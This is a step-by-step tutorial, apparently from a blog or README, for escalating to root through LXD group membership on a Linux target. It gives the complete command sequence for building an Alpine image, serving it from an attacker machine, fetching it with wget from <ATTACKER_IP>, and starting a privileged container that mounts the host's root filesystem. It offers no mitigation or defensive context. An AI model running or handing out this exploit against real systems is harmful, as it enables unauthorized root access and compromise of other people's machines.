<h2>1. Check your target machine vulnerability</h2>

Once you connect to your target via SSH, you need to run the ID command to see if the machine is vulnerable  
to this LXD Privilege Escalation exploit (current user must be a member of lxd group).

As we can see in the screenshot below, user John is the member of lxd group, which means that the machine is vulnerable.    
  
![LXD group](https://i.imgur.com/r8oFRyo.png)

<br>
    
<h2>2. Prepare a linux container image</h2>

THIS STEP SHOULD BE DONE ON THE ATTACKER MACHINE

<br>

To prepare the linux container, you should firstly download lxd-alpine-builder through the git repository:
> git clone https://github.com/saghul/lxd-alpine-builder.git

Go into the newly made (cloned from github) directory called lxd-alpine-builder and build the Alpine image using the following command:
> sudo ./build-alpine

If the script successfully executed, it would make an file in the tar.gz format that contains the Alpine linux container.

<br>

<h2>3. Sending the Alpine linux container to the target</h2>

Now, you need to find a way to send the previously made Alpine linux container (tar.gz file with a big name) to the target machine.

For example, one way would be to make a http server in the lxd-alpine-builder directory and download the tar.gz file from it.
It can be done very easily using the pythons built-in function http.server (run the following command on your attacker machine):
> python3 -m http.server

Next, you need to download the tar.gz file, on the target machine, from the http server. You can do that via the browser, but I like to do it
via the tool called wget (run the following command on your target machine):
> wget <ATTACKER_IP>:8000/<CONTAINER_NAME>.tar.gz

where <ATTACKER_IP> is the ip of the attacker machine and  <CONTAINER_NAME> is the name of the Alpine linux container   
(for example, alpine-v3.10-x86_64-20191008_1227).

<br>

<h2>4. Configuring the container on the target machine</h2>

And finally, we need to actually "exploit" this.
For gaining root privileges we need to import the previously downloaded container into lxc.   
<br>
After that, we need to give the container privileges, add the root directory as a mount point, and start the container.
To do all this, run following commands on the target machine:
> lxc image import ./alpine-v3.10-x86_64-20191008_1227.tar.gz --alias myimage  
> lxc init myimage ignite -c security.privileged=true  
> lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true  
> lxc start ignite  
> lxc exec ignite /bin/sh  

If everything succeded, we should get a bash shell in which we can do the following to actually get to the root directories  
of the target machine:
> cd /mnt/root

<br>
<hr>

And BOOM, we have successfully gained control of the root account, without actually knowing the root password  
(aka. successful privilege escalation)
